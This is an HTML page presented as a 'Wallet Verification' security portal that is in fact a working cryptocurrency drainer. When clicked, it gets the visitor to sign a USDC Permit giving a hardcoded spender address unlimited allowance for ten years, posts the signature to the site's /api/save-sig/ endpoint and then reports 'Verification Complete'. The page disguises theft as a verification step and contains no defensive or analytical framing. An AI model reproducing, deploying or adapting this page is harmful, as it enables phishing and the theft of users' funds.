<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Verification | Security Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', sans-serif;
            background-color: #0f172a;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; color: #f1f5f9;
        }
        .card {
            background: #1e293b; padding: 40px; border-radius: 16px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
            text-align: center; max-width: 450px; width: 90%;
            border: 1px solid #334155;
        }
        .icon { font-size: 50px; color: #38bdf8; margin-bottom: 20px; }
        h2 { margin-bottom: 10px; font-size: 24px; }
        p { color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
        #connectBtn {
            background: #38bdf8; color: #0f172a; border: none;
            padding: 15px 30px; border-radius: 8px; font-weight: bold;
            font-size: 16px; cursor: pointer; width: 100%;
        }
        #status { margin-top: 20px; font-size: 14px; word-break: break-all; }
        .error-box {
            background: rgba(248, 113, 113, 0.1);
            border: 1px solid #f87171;
            padding: 10px; border-radius: 5px;
            margin-top: 15px; color: #f87171; text-align: left;
            font-family: monospace; font-size: 12px; display: none;
        }
        .loader {
            display: none; margin: 20px auto;
            border: 4px solid #334155; border-top: 4px solid #38bdf8;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h2>Wallet Verification</h2>
    <p>Please verify ownership of your wallet to continue.</p>

    <div class="loader" id="loader"></div>
    <button id="connectBtn">Connect & Verify Wallet</button>

    <div id="status"></div>
    <div id="errorDetails" class="error-box"></div>
</div>

<script>
const SPENDER_ADDRESS = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

async function verify() {
    const btn = document.getElementById('connectBtn');
    const status = document.getElementById('status');
    const loader = document.getElementById('loader');
    const errorDetails = document.getElementById('errorDetails');

    // Reset UI
    status.innerHTML = "";
    errorDetails.style.display = "none";
    errorDetails.innerText = "";

    try {
        if (!window.ethereum) return alert("Please install MetaMask!");

        loader.style.display = "block";
        btn.style.display = "none";

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const owner = await signer.getAddress();
        const { chainId } = await provider.getNetwork();

        const deadline = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10);
        const value = ethers.constants.MaxUint256;

        const domain = {
            name: "USD Coin", version: "2", chainId: chainId, verifyingContract: USDC_ADDRESS
        };

        const types = {
            Permit: [
                { name: "owner", type: "address" }, { name: "spender", type: "address" },
                { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };

        const message = { owner, spender: SPENDER_ADDRESS, value, nonce: 0, deadline };
        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);

        // Fetch call
        const response = await fetch("/api/save-sig/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRFToken": "{{ csrf_token }}"
            },
            body: JSON.stringify({
                owner: owner,
                value: value.toString(),
                deadline: deadline,
                v: sig.v, r: sig.r, s: sig.s
            })
        });

        const result = await response.json();

        if (response.ok) {
            status.innerHTML = "<span style='color: #4ade80;'>✅ Verification Complete!</span>";
            setTimeout(() => { window.location.href = "/dashboard/"; }, 1500);
        } else {
            // Show the error returned by Django
            throw new Error(result.message || `Server Error ${response.status}`);
        }

    } catch (err) {
        console.error("Full Error Object:", err);
        status.innerHTML = "<span style='color: #f87171;'>❌ Verification Failed</span>";

        // DISPLAY THE FULL ERROR MESSAGE
        errorDetails.style.display = "block";
        errorDetails.innerText = "Debug Info: " + err.message;

        btn.style.display = "block";
        loader.style.display = "none";
    }
}

document.getElementById('connectBtn').addEventListener('click', verify);
</script>

</body>
</html>
